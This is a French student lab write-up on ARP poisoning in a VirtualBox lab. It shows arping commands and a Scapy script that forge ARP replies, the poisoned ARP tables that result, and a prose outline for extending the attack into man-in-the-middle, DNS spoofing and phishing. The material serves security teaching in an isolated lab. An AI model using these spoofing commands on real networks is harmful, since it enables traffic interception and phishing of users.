# TP4 : ARP Poisoning

- [TP4 : ARP Poisoning](#tp4--arp-poisoning)
  - [I. Setup](#i-setup)
  - [II. Premiers pas sur l'attaque](#ii-premiers-pas-sur-lattaque)
  - [III. Aller plus loin](#iii-aller-plus-loin)
    - [1. Scapy](#1-scapy)
    - [2. Pousser l'attaque](#2-pousser-lattaque)

## I. Setup

Il vous faudra trois machines :

- deux victimes
- un attaquant

Je vous laisse libre des détails concernant le setup, vous pouvez :

- utiliser GNS ou juste utiliser un réseau local avec votre hyperviseur (host-only avec VirtualBox)
- mettre en place un setup plus réaliste avec une des deux victimes qui est un routeur
  - le routeur donne accès internet à la victime
  - ainsi vous vous positionnez entre la victime et le routeur
- utiliser une distribution Linux orientée sécu peut être une bonne idée (Kali, BlackArch, etc.)

Assurez-vous que tout le monde se ping avant de continuer.

```bash
[dorian@router ~]$ ip a
[...]
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:29:6b:d0 brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.15/24 brd 10.0.2.255 scope global dynamic noprefixroute enp0s3
       valid_lft 85976sec preferred_lft 85976sec
    inet6 fe80::a00:27ff:fe29:6bd0/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
3: enp0s8: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:6e:17:21 brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.102/24 brd 192.168.56.255 scope global dynamic noprefixroute enp0s8
       valid_lft 478sec preferred_lft 478sec
    inet6 fe80::c965:f80c:3dc3:e09a/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
```

```bash
[dorian@victime ~]$ ip a
[...]
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:00:9a:bc brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.104/24 brd 192.168.56.255 scope global dynamic noprefixroute enp0s3
       valid_lft 462sec preferred_lft 462sec
    inet6 fe80::a00:27ff:fe00:9abc/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
```

```bash
[dorian@laptop-dorian ~]$ ip a
[...]
4: vboxnet0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 0a:00:27:00:00:00 brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.1/24 brd 192.168.56.255 scope global vboxnet0
       valid_lft forever preferred_lft forever
    inet6 fe80::800:27ff:fe00:0/64 scope link proto kernel_ll 
       valid_lft forever preferred_lft forever
[...]
```

➜ **Tout le monde peut bien se ping**

## II. Premiers pas sur l'attaque

➜ **Poisoning basique**

- **depuis l'attaquant, utiliser une commande [`arping`](https://sandilands.info/sgordon/arp-spoofing-on-wired-lan)**
  - utilisez-la pour écrire des données arbitraires dans la table ARP de la victime
  - vous pouvez vraiment forcer l'écriture de n'importe quoi, amusez vous avec la commande
  - genre la mac `aa:aa:aa:aa:aa:aa` qui correspond à l'IP `10.10.10.10.` peu importe, faites des tests
- **depuis la victime**
  - constatez les changements dans la table ARP
  - sous Linux c'est `ip neighbor show` pour voir la table ARP
  - on peut abréger cette commande en `ip n s`
- **depuis l'attaquant**
  - utilisez Wireshark pour voir les trames envoyées

```bash
[dorian@laptop-dorian ~]$ arping -c 100 -U -s 192.168.56.102 -I vboxnet0 192.168.56.104
ARPING 192.168.56.104 from 192.168.56.102 vboxnet0
```

```bash
[dorian@laptop-dorian ~]$ arping -c 100 -U -s 192.168.56.104 -I vboxnet0 192.168.56.102
ARPING 192.168.56.102 from 192.168.56.104 vboxnet0
```

```bash
[dorian@router ~]$ ip n s
192.168.56.241 dev enp0s8 lladdr 08:00:27:41:b5:89 STALE 
192.168.56.104 dev enp0s8 lladdr 0a:00:27:00:00:00 STALE 
192.168.56.100 dev enp0s8 lladdr 08:00:27:d2:59:36 STALE 
10.0.2.2 dev enp0s3 lladdr 52:54:00:12:35:02 STALE 
10.0.2.3 dev enp0s3 lladdr 52:54:00:12:35:03 STALE 
192.168.56.1 dev enp0s8 lladdr 0a:00:27:00:00:00 REACHABLE 
```

```bash
[dorian@victime ~]$ ip n s
192.168.56.102 dev enp0s3 lladdr 0a:00:27:00:00:00 STALE 
192.168.56.240 dev enp0s3 lladdr 08:00:27:41:b5:89 STALE 
192.168.56.103 dev enp0s3 lladdr 08:00:27:41:b5:89 STALE 
192.168.56.1 dev enp0s3 lladdr 0a:00:27:00:00:00 REACHABLE 
192.168.56.100 dev enp0s3 lladdr 08:00:27:d2:59:36 STALE 
```

## III. Aller plus loin

### 1. Scapy

➜ **Apprendre à juste envoyer des trames basiques avec Scapy**

- des ping par exemple
  - la commande `ping` envoie des paquets de type ICMP
  - les paquets ICMP servent à plein de trucs, et il y a un identifiant pour chaque fonction, c'est un entier qui est indiqué dans le paquet ICMP
  - type `8` : *echo request* : c'est le ping
  - type `0` : *echo reply* : c'est le pong

```bash
>>> packet=IP(dst='192.168.56.104')/ICMP()/Raw(load=RandString(56))
```

```bash
>>> answer=sr1(packet, timeout=1)
Begin emission:
Finished sending 1 packets.
.*
Received 2 packets, got 1 answers, remaining 0 packets
```

```bash
>>> answer.show
###[ IP ]### 
  version   = 4
  ihl       = 5
  tos       = 0x0
  len       = 84
  id        = 65444
  flags     = 
  frag      = 0
  ttl       = 64
  proto     = icmp
  chksum    = 0x894a
  src       = 192.168.56.104
  dst       = 192.168.56.1
  \options   \
###[ ICMP ]### 
     type      = echo-reply
     code      = 0
     chksum    = 0xdf59
     id        = 0x0
     seq       = 0x0
     unused    = ''
###[ Raw ]### 
        load      = 'ZyzpOEBLt0DPhF4wO0BGtrURYnBOJKUwEHrBA68A5ec7aIZEN6R6PGXN'
```

> Les autres types ICMP servent à d'autres trucs que la commande `ping`. Voyez ICMP comme un protocole de diagnostic réseau.

- jouer avec ARP

> Gardez **Wireshark** ouvert pour tout le temps avoir un oeil sur ce qu'il se passe concrètement.

➜ Mettre en place la même attaque qu'avec `arping`

```bash
from scapy.all import *
```

```bash
>>> arpspoofed= ARP(op=2, psrc="192.168.56.106", pdst="192.168.56.107", hwdst="08:00:27:41:b5:89")
>>> arpspoofed.show()
###[ ARP ]### 
  hwtype    = Ethernet (10Mb)
  ptype     = IPv4
  hwlen     = None
  plen      = None
  op        = is-at
  hwsrc     = 08:00:27:41:b5:89
  psrc      = 192.168.56.106
  hwdst     = 08:00:27:41:b5:89
  pdst      = 192.168.56.107
```

```bash
>>> send(arpspoofed)
.
Sent 1 packets.
```

### 2. Pousser l'attaque

Pour aller plus loin sur l'attaque, comme on a discuté plus tôt en cours, le classique c'est :

- **ARP poisoning sur la victime et le routeur**
- agir soi-même comme un routeur de façon transparente, et faire suivre les trames vers les vrais destinataires (man-in-the-middle)
- **intercepter les requêtes DNS du client** qui sont en clair
- répondre de façon malicieuse
- guider la victime vers un site de phishing

Pour ce faiiire :

- il faudra encore utiliser **Scapy**
- je vous aiderai évidemment, mais commencez par Google, il y a énormément de code qui explique comment faire tout ça :)
